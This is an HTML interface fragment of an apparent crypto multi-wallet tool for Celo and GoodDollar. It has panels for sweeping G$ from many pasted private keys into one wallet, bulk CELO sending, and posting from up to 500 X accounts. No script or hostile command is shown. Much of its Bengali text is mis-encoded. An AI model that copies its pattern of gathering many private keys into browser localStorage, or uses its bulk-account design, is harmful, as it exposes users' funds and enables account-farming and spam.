                <label for="destinationAddress" id="destinationAddressLabel">Destination Wallet Address (where to collect all G$):</label>
                <div style="display: flex; gap: 8px;">
                    <input type="text" id="destinationAddress" placeholder="0xYourDestinationWallet" style="flex: 1;">
                    <button type="button" class="validate-btn" onclick="loadMasterWalletToDestination()" style="padding: 8px 12px; font-size: 12px; background: #ff9800; white-space: nowrap;">üëë Use Master<br><span style="font-size: 10px;">(RECOMMENDED)</span></button>
                </div>
            </div>
            
            <div class="form-group">
                <label for="tokenBatchSize">Batch Size (concurrent wallets, 1-100):</label>
                <input type="number" id="tokenBatchSize" value="5" min="1" max="100" placeholder="5">
                <small style="color: #666; display: block; margin-top: 5px;">Recommended: 5-20 for bulk operations</small>
            </div>
            
            <div class="form-group">
                <label for="tokenPrivateKeys">Private Keys (one per line):</label>
                <textarea id="tokenPrivateKeys" rows="10" placeholder="0xYourPrivateKey1&#10;0xYourPrivateKey2&#10;0xYourPrivateKey3&#10;..."></textarea>
                <button class="validate-btn" onclick="validateAndCleanTokenKeys()">üîç Validate & Clean</button>
                <div id="tokenValidationSection" class="validation-section"></div>
            </div>

            <button class="validate-btn" id="checkTokenBalanceButton" onclick="checkTokenBalances()" style="background: #2196F3; width: 100%; margin-bottom: 20px;" data-token="g">üí∞ Check G$ Balance</button>
            
            <button class="button" id="tokenButton" onclick="runBatchTokenCollectionWithSave()">Start Token Collection</button>

            <!-- Token Collection Error Category Buttons -->
            <div class="non-claimed-buttons-container" id="tokenErrorButtonsContainer" style="display: none; margin: 15px 0;">
                <button class="non-claimed-category-btn" id="noBalanceTokenBtn" onclick="showTokenErrorCategory('noBalance')" title="‡¶ï‡ßã‡¶®‡ßã ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏ ‡¶®‡ßá‡¶á">
                    ‚ùå ‡¶ï‡ßã‡¶®‡ßã Balance (<span id="noBalanceTokenCount">0</span>)
                </button>
                <button class="non-claimed-category-btn" id="noGasTokenBtn" onclick="showTokenErrorCategory('noGas')" title="‡¶ó‡ßç‡¶Ø‡¶æ‡¶∏ ‡¶´‡¶ø ‡¶®‡ßá‡¶á">
                    ‚õΩ ‡¶ï‡ßã‡¶®‡ßã Gas (<span id="noGasTokenCount">0</span>)
                </button>
            </div>

            <div id="tokenBalanceDisplaySection" style="display: none; margin-top: 20px; margin-bottom: 20px;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 8px; color: white; text-align: center; margin-bottom: 15px;">
                    <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px; text-transform: uppercase;" id="tokenTotalLabel">Total G$ Balance</div>
                    <div style="font-size: 32px; font-weight: 700;" id="tokenTotalBalance">0 G$</div>
                </div>
                <div style="background: #f5f5f5; padding: 15px; border-radius: 8px;">
                    <h3 style="margin-bottom: 15px; font-size: 14px; color: #333;">Individual Wallets with Balance</h3>
                    <div id="tokenBalanceList"></div>
                </div>
                <button class="validate-btn" id="deleteZeroGButton" onclick="deleteAllZeroTokenWallets()" style="background: #ff6b6b; width: 100%; margin-top: 15px; display: none;">üóëÔ∏è Delete Wallets with 0 Balance</button>
            </div>

            <!-- Wallets without selected token section -->
            <div id="noTokenWalletsSection" style="display: none; margin-top: 20px; margin-bottom: 20px;">
                <div style="background: linear-gradient(135deg, #ff6b6b 0%, #ff5252 100%); padding: 20px; border-radius: 8px; color: white; text-align: center; margin-bottom: 15px; cursor: pointer;" onclick="toggleNoTokenWalletsModal()">
                    <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px; text-transform: uppercase;">‚ö†Ô∏è Wallets Without Selected Token</div>
                    <div style="font-size: 28px; font-weight: 700;" id="noTokenWalletsCount">0</div>
                    <div style="font-size: 11px; opacity: 0.8; margin-top: 8px;">üîë Click to view private keys</div>
                </div>
            </div>

            <!-- No Token Wallets Modal -->
            <div class="modal-overlay" id="noTokenWalletsModal">
                <div class="modal-content">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <div class="modal-header" id="noTokenWalletsTitle" style="margin: 0; border: none; padding: 0;">üîë Wallets Without Selected Token</div>
                        <button id="noTokenWalletsCopyBtn" class="modal-copy-all-btn" onclick="copyAllNoTokenWallets()">üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                    <div class="modal-description" id="noTokenWalletsDesc">
                        ‡¶®‡ßÄ‡¶ö‡ßá ‡¶Ø‡ßá wallet‡¶ó‡ßÅ‡¶≤‡¶æ‡¶∞ ‡¶®‡¶ø‡¶∞‡ßç‡¶¨‡¶æ‡¶ö‡¶ø‡¶§ ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶®‡ßá‡¶á ‡¶∏‡ßá‡¶ó‡ßÅ‡¶≤‡¶æ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡•§
                    </div>
                    <div class="modal-keys-list" id="noTokenWalletsList">
                    </div>
                    <div class="modal-actions">
                        <button class="modal-btn modal-btn-close" onclick="closeNoTokenWalletsModal()">‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                </div>
            </div>
            
            <div class="logs" id="tokenLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats" id="tokenStats">
                    <div class="stat-card stat-total">
                        <div class="stat-value" id="tokenStatTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-card stat-success">
                        <div class="stat-value" id="tokenStatSuccess">0</div>
                        <div class="stat-label">Success</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="tokenStatError">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress" id="tokenProgress"></div>
                <div id="tokenLogs"></div>
            </div>

            <!-- Token Collection Failed Keys Modal -->
            <div class="modal-overlay" id="tokenFailedKeysModal">
                <div class="modal-content">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <div class="modal-header" id="tokenModalTitle" style="margin: 0; border: none; padding: 0;">‚ùå ‡¶ï‡ßã‡¶®‡ßã Balance (0)</div>
                        <button id="tokenCopyAllBtn" class="modal-copy-all-btn" onclick="copyAllTokenFailedKeys(this)">üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                    <div style="display: flex; gap: 8px; margin-bottom: 15px;">
                        <button class="modal-view-btn active" id="tokenViewPrivateKeyBtn" onclick="switchTokenViewMode('privateKey', this)">üîë Private Key ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®</button>
                        <button class="modal-view-btn" id="tokenViewAddressBtn" onclick="switchTokenViewMode('address', this)">üìç Address ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®</button>
                    </div>
                    <div class="modal-description" id="tokenModalDescription">
                        ‡¶®‡ßÄ‡¶ö‡ßá ‡¶∏‡¶¨ failed wallets ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶≤‡¶æ‡¶á‡¶®‡ßá‡¶∞ ‡¶°‡¶æ‡¶® ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‡•§
                    </div>
                    <div class="modal-keys-list" id="tokenFailedKeysList">
                    </div>
                    <div class="modal-actions">
                        <button class="modal-btn modal-btn-close" onclick="closeTokenFailedKeysModal()">‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank">facebook.com/amarboumunni</a>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Multi G$ Sender View -->
    <div id="multiGoodDollarSender" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>Multi G$ Sender (GoodDollar)</h1>
            <p class="subtitle">A utility to help verified users send G$ tokens to multiple verified addresses efficiently through batch transactions</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side in your browser. Private keys never leave your device.
            </div>
            
            <div class="form-group">
                <label for="gSenderNetwork">Select Network:</label>
                <select id="gSenderNetwork" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">‚úÖ Celo Mainnet</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="gSenderRpcUrl">RPC URL:</label>
                <input type="text" id="gSenderRpcUrl" value="https://forno.celo.org" placeholder="Enter RPC URL">
            </div>
            
            <div class="form-group">
                <label for="gSenderMainPrivateKey">Sender Wallet Private Key (Must have G$ & CELO for gas):</label>
                <input type="password" id="gSenderMainPrivateKey" placeholder="0xYourPrivateKey" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px;">
            </div>
            
            <div class="form-group">
                <label for="gRecipientAddresses">Recipient Addresses (one per line):</label>
                <textarea id="gRecipientAddresses" rows="10" placeholder="0xRecipient1&#10;0xRecipient2&#10;0xRecipient3&#10;..."></textarea>
            </div>
            
            <div class="form-group">
                <label for="gAmount">Amount per Address (G$):</label>
                <input type="number" id="gAmount" value="100" placeholder="100">
            </div>
            
            <button type="button" class="button" onclick="showUnavailableMessage()" disabled style="opacity: 0.6; cursor: not-allowed;">Send G$ to All</button>
            
            <div class="logs" id="gSenderLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats">
                   <div class="stat-card stat-total"><div class="stat-value" id="gSenderStatTotal">0</div><div class="stat-label">Total</div></div>
                   <div class="stat-card stat-success"><div class="stat-value" id="gSenderStatSuccess">0</div><div class="stat-label">Success</div></div>
                   <div class="stat-card stat-error"><div class="stat-value" id="gSenderStatError">0</div><div class="stat-label">Failed</div></div>
                </div>
                <div id="gSenderLogs"></div>
            </div>
        </div>
    </div>

    <!-- Multi Sender View -->
    <div id="multiSender" class="view">
        <div class="container">
            <h1>Multi Sender (CELO)</h1>
            <p class="subtitle">A utility to help users send CELO to multiple verified addresses efficiently through batch transactions</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side in your browser. Private keys never leave your device.
            </div>
            
            <div class="warning" style="background: #e3f2fd; border-color: #2196F3; color: #0d47a1;">
                <strong>üìã Setup Required</strong>
                First, deploy the MultiSender contract. <a href="javascript:void(0)" onclick="showDeploymentInstructions()" style="color: #0d47a1; text-decoration: underline; font-weight: 600;">View Deployment Guide</a>
            </div>
            
            <div class="form-group">
                <label for="senderNetwork">Select Network:</label>
                <select id="senderNetwork" onchange="updateSenderNetworkConfig()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">‚úÖ Celo Mainnet (Recommended)</option>
                    <option value="xdc">‚úÖ XDC (XinFin) Network</option>
                    <option value="fuse" disabled style="color: #999;">üî• Fuse Network (Coming Soon)</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="senderRpcUrl">RPC URL:</label>
                <input type="text" id="senderRpcUrl" value="https://forno.celo.org" placeholder="Enter RPC URL">
            </div>
            
            <div class="form-group">
                <label for="senderMainPrivateKey">Sender Wallet Private Key:</label>
                <div style="display: flex; gap: 8px;">
                    <input type="password" id="senderMainPrivateKey" placeholder="0xYourPrivateKey" style="flex: 1;">
                    <button type="button" class="validate-btn" onclick="loadMasterWalletToSender()" style="padding: 8px 12px; font-size: 12px; background: #ff9800; white-space: nowrap;">üëë Use Master<br><span style="font-size: 10px;">(RECOMMENDED)</span></button>
                </div>
                <small style="color: #666; display: block; margin-top: 5px;">Wallet that will send CELO to all recipients</small>
            </div>
            
            <div class="form-group">
                <label for="recipientAddresses">Recipient Addresses (up to 100 per batch):</label>
                <textarea id="recipientAddresses" rows="10" placeholder="0xRecipient1&#10;0xRecipient2&#10;0xRecipient3&#10;..."></textarea>
                <div style="display: flex; gap: 10px; margin-top: 8px;">
                    <button type="button" class="button" style="flex: 1; padding: 8px;" onclick="formatAddresses()">Format Addresses</button>
                    <button type="button" class="button" style="flex: 1; padding: 8px;" onclick="cleanAddresses()">Clean</button>
                </div>
            </div>
            
            <div class="form-group">
                <label for="amountPerAddress">Amount per Address (CELO):</label>
                <input type="number" id="amountPerAddress" value="0.1" step="0.001" min="0.001" placeholder="0.1">
                <small style="color: #666; display: block; margin-top: 5px;">Amount in CELO to send to each address</small>
            </div>
            
            <button class="button" id="senderButton" onclick="runMultiSenderWithSave()">Send CELO to All</button>
            
            <div class="logs" id="senderLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats" id="senderStats">
                    <div class="stat-card stat-total">
                        <div class="stat-value" id="senderStatTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-card stat-success">
                        <div class="stat-value" id="senderStatSuccess">0</div>
                        <div class="stat-label">Success</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="senderStatError">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress" id="senderProgress"></div>
                <div id="senderLogs"></div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank">facebook.com/amarboumunni</a>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Wallet Balance Checker View -->
    <div id="balanceChecker" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>Wallet Balance Checker</h1>
            <p class="subtitle">View native token and G$ balances for all imported wallets</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side in your browser. Private keys are only used for wallet address derivation.
            </div>
            
            <div class="form-group">
                <label for="balanceNetwork">Select Network:</label>
                <select id="balanceNetwork" onchange="updateBalanceNetworkConfig()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">‚úÖ Celo Mainnet (Recommended)</option>
                    <option value="xdc">‚úÖ XDC (XinFin) Network</option>
                    <option value="fuse" disabled style="color: #999;">üî• Fuse Network (Coming Soon)</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="balanceRpcUrl">RPC URL:</label>
                <input type="text" id="balanceRpcUrl" value="https://forno.celo.org" placeholder="Enter RPC URL">
            </div>
            
            <div class="form-group">
                <label for="balanceTokenAddress">G$ Token Contract Address:</label>
                <input type="text" id="balanceTokenAddress" value="0x62B8B59b4FC32e4D09521C127bf1841917287da8" placeholder="Enter G$ token address">
            </div>
            
            <div class="form-group">
                <label for="balancePrivateKeys">Private Keys (one per line):</label>
                <textarea id="balancePrivateKeys" rows="10" placeholder="0xYourPrivateKey1&#10;0xYourPrivateKey2&#10;0xYourPrivateKey3&#10;..."></textarea>
                <button class="validate-btn" onclick="validateAndCleanBalanceKeys()">üîç Validate & Clean</button>
                <div id="balanceValidationSection" class="validation-section"></div>
            </div>
            
            <button class="button" id="checkBalanceButton" onclick="showUnavailableMessage()" disabled style="opacity: 0.6; cursor: not-allowed;">Check Balances Now</button>
            
            <div id="balanceResultsSection" style="display: none; margin-top: 30px;">
                <div class="balance-summary">
                    <div class="balance-total">
                        <div class="balance-total-label">Total Native Token</div>
                        <div class="balance-total-value" id="balanceTotalNative">0 <span id="balanceNativeSymbol">CELO</span></div>
                    </div>
                    <div class="balance-total">
                        <div class="balance-total-label">Total G$ Token</div>
                        <div class="balance-total-value" id="balanceTotalG">0 G$</div>
                    </div>
                </div>

                <div id="deleteNonGDollarSection" style="display: none; margin-bottom: 20px;">
                    <button class="validate-btn" onclick="deleteNonGDollarWallets()" style="background: #ff6b6b; width: 100%; padding: 12px; font-size: 14px;">üóëÔ∏è Delete non-G$ wallets</button>
                </div>
                
                <div class="balance-table-container">
                    <table class="balance-table">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Wallet Address</th>
                                <th>Native Token</th>
                                <th>G$ Token</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody id="balanceTableBody">
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank">facebook.com/amarboumunni</a>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Batch X Post View -->
    <div id="batchXPost" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>ùïè Batch X Post Tool</h1>
            <p class="subtitle">Post to multiple X (Twitter) accounts simultaneously</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All X API keys are stored in your browser's local storage. Never share these keys with anyone. Clear them after use for maximum security.
            </div>

            <!-- Post Message -->
            <div class="form-group">
                <label for="xPostMessage">Post Message:</label>
                <textarea id="xPostMessage" rows="6" placeholder="Write your message here... (max 280 characters)" maxlength="280" onkeyup="updateCharCount()"></textarea>
                <small style="color: #666; display: block; margin-top: 5px;"><span id="charCount">0</span>/280 characters</small>
            </div>

            <!-- X Account Management -->
            <div class="form-group">
                <label>X Account Management:</label>
                <div style="display: flex; gap: 8px; margin-bottom: 15px;">
                    <input type="text" id="xApiKey" placeholder='Paste JSON: {"api_key":"xxx","api_secret":"yyy","access_token":"zzz","access_token_secret":"www"}' style="flex: 1; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 12px; font-family: 'Courier New';">
                    <button class="button" onclick="addXAccount()" style="padding: 12px 20px; background: #48bb78;">‚ûï Add</button>
                </div>
                <small style="color: #666; display: block; margin-top: 5px;">
                    üí° Get from Twitter Developer Portal ‚Üí Keys and tokens ‚Üí Copy JSON with all 4 credentials
                </small>
            </div>

            <!-- Connected Accounts List -->
            <div class="form-group">
                <label>Connected X Accounts: <span id="accountCount">0</span>/500</label>
                <div id="xAccountsList" style="max-height: 300px; overflow-y: auto; border: 2px solid #ddd; border-radius: 6px; padding: 10px; background: #f9f9f9;">
                    <div style="color: #999; text-align: center; padding: 30px; font-size: 14px;">No accounts added yet. Add your first X account!</div>
                </div>
            </div>

            <!-- Batch Post Button -->
            <button class="button" id="xPostButton" onclick="showUnavailableMessage()" style="width: 100%; padding: 15px; font-size: 16px; background: #ccc; margin-bottom: 20px; color: white; font-weight: 700; opacity: 0.6; cursor: not-allowed;" disabled>
                üì§ Post to All Accounts
            </button>

            <!-- Live Logs -->
            <div class="logs" id="xPostLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats" id="xPostStats">
                    <div class="stat-card stat-total">
                        <div class="stat-value" id="xPostStatTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-card stat-success">
                        <div class="stat-value" id="xPostStatSuccess">0</div>
                        <div class="stat-label">Posted</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="xPostStatError">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress" id="xPostProgress"></div>
                <div id="xPostLogs"></div>
            </div>

            <!-- Posted Links Collection -->
            <div class="form-group" style="margin-top: 30px;">
                <label>üîó Posted Tweet Links (Permanently Saved): <span id="postedCount">0</span></label>
                <div id="postedMessagesList" style="max-height: 300px; overflow-y: auto; border: 3px solid #FF1493; border-radius: 6px; padding: 12px; background: #fff5f8;">
                    <div style="color: #999; text-align: center; padding: 30px; font-size: 14px;">No posts yet. Links will appear here automatically!</div>
                </div>
                <div style="display: flex; gap: 10px; margin-top: 10px;">
                    <button class="button" onclick="copyAllPostedMessages()" style="flex: 1; background: #2196F3;">üìã Copy All Links</button>
                    <button class="button" onclick="downloadPostedMessages()" style="flex: 1; background: #ff9800;">‚¨áÔ∏è Download TXT</button>
                    <button class="button" onclick="clearPostedMessages()" style="flex: 1; background: #ff6b6b;">üóëÔ∏è Clear All</button>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Pocket Manager View -->
    <div id="pocketManager" class="view">
        <div class="container">
            <h1>üëú TokenPocket Manager</h1>
            <p class="subtitle">Import wallets & connect to any dApp (Uniswap, Aave, etc)</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Private Key Security</strong>
                All private keys are stored only in your browser's localStorage. Never leave this page open on shared computers!
            </div>

            <!-- Batch Import Section -->
            <div class="form-group">
                <label>üì• Batch Import Wallets:</label>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
                    <div>
                        <input type="file" id="pocketImportFile" accept=".csv,.json,.txt" style="width: 100%; padding: 10px; border: 2px dashed #2196F3; border-radius: 6px; cursor: pointer;">
                        <div style="font-size: 11px; color: #666; margin-top: 5px;">üìã CSV: 1 key per line | üìÑ JSON: {"keys": ["key1", "key2"]}</div>
                    </div>
                    <button class="button" onclick="importPocketFromFile()" style="background: #2196F3; padding: 10px;">üì§ Import from File</button>
                </div>
                <textarea id="pocketBatchImport" placeholder="Or paste multiple private keys here (1 per line, with or without 0x)" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-family: 'Courier New'; font-size: 12px; min-height: 80px; resize: vertical; margin-bottom: 10px;"></textarea>
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="importPocketBatch()" style="flex: 1; background: #48bb78; padding: 12px; font-weight: 700;">‚úÖ Import Batch Keys</button>
                    <button class="button" onclick="clearAllPocketWallets()" style="flex: 1; background: #ff6b6b; padding: 12px; font-weight: 700;">üóëÔ∏è Clear All Wallets</button>
                </div>
            </div>

            <!-- Pocket Wallets List -->
            <div class="form-group">
                <label>üí∞ Your Pocket Wallets: <span id="pocketWalletCount">0</span> total</label>
                <div id="pocketWalletsList" style="max-height: 400px; overflow-y: auto; border: 2px solid #ddd; border-radius: 6px; padding: 12px; background: #f9f9f9;">
                    <div style="color: #999; text-align: center; padding: 30px; font-size: 13px;">Import wallets to get started! üì•</div>
                </div>
            </div>

            <!-- Active Wallet Display -->
            <div id="pocketActiveDisplay" style="padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 6px; margin: 20px 0; display: none;">
                <div style="font-size: 13px; margin-bottom: 10px;"><strong>üîå Active Pocket Wallet:</strong></div>
                <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 4px; font-family: 'Courier New'; font-size: 11px; word-break: break-all; margin-bottom: 10px;">
                    <span id="pocketActiveAddress">--</span>
                </div>
            </div>

            <!-- Connect to dApp -->
            <div class="form-group">
                <label>üîó Connect Pocket to dApp:</label>
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <select id="pocketDappSelect" onchange="togglePocketCustomUrl()" style="flex: 1; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                        <option value="">-- Select a dApp --</option>
                        <option value="custom">üîß Custom URL</option>
                        <option value="uniswap">ü¶Ñ Uniswap (Swap)</option>
                        <option value="aavecelo">üè¶ Aave (Celo)</option>
                        <option value="curve">üìà Curve Finance</option>
                    </select>
                    <input type="text" id="pocketCustomUrl" placeholder="Enter custom dApp URL..." style="flex: 1; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px; display: none;">
                    <button class="button" onclick="connectPocketToDapp()" style="background: #667eea; padding: 12px 20px; font-weight: 700; white-space: nowrap;">üöÄ Connect</button>
                </div>
            </div>

            <!-- Connected dApp Status -->
            <div id="pocketDappStatus" style="padding: 15px; background: #d4edda; border: 2px solid #48bb78; border-radius: 6px; display: none; margin-bottom: 20px;">
                <div style="font-size: 13px;"><strong>‚úÖ Connected to dApp!</strong></div>
                <div id="pocketDappStatusText" style="font-size: 12px; margin-top: 8px; color: #48bb78;"></div>
            </div>

            <div style="padding: 15px; background: #e3f2fd; border-left: 4px solid #2196F3; border-radius: 6px; margin-bottom: 20px;">
                <strong>üí° How It Works:</strong>
                <ol style="margin: 10px 0; padding-left: 20px; line-height: 1.6; font-size: 13px;">
                    <li>üì• Import private keys (batch paste or file upload)</li>
                    <li>üëú Your pocket stores all wallets in localStorage</li>
                    <li>üîó Select a dApp and click "Connect"</li>
                    <li>‚ö° Your wallet injects as ethereum provider into the dApp</li>
                    <li>üéØ Use dApp normally with your Pocket wallet!</li>
                </ol>
            </div>
        </div>
    </div>


    <!-- Swap View - Embedded DEX -->
    <div id="swap" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>üí± Swap</h1>
            <p class="subtitle">Swap tokens on Celo and XDC networks</p>

            <div class="warning">
                <strong>‚ö†Ô∏è Quick Setup</strong>
                Enter private key or Load Master ‚Üí Select network ‚Üí Start swapping!
            </div>

            <!-- Private Key Input & Connection -->
            <div class="form-group">
                <label for="swapPrivateKey">Wallet Connection:</label>
                <div style="display: flex; gap: 8px; margin-bottom: 15px;">
                    <input 
                        type="password" 
                        id="swapPrivateKey" 
                        placeholder="Enter private key (with or without 0x)" 
                        style="flex: 1; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px; font-family: 'Courier New';"
                    >
                    <button type="button" onclick="showUnavailableMessage()" disabled style="padding: 12px 20px; background: #999; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: not-allowed; opacity: 0.6;">üîó Connect</button>
                    <button type="button" onclick="showUnavailableMessage()" disabled style="padding: 12px 15px; background: #999; color: white; border: none; border-radius: 6px; font-weight: 700; cursor: not-allowed; opacity: 0.6;">üëë Use Master</button>
                </div>
                <div id="swapWalletStatus" style="padding: 12px; background: rgba(200, 200, 200, 0.1); border-left: 4px solid #999; border-radius: 6px; color: #666; font-size: 12px; display: none;">
                    Not connected
                </div>
            </div>

            <!-- Network Selection -->
            <div class="form-group">
                <label for="swapNetworkWidget">Select Network:</label>
                <select id="swapNetworkWidget" onchange="switchSwapWidget()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">ü¶Ñ Celo Network (Uniswap)</option>
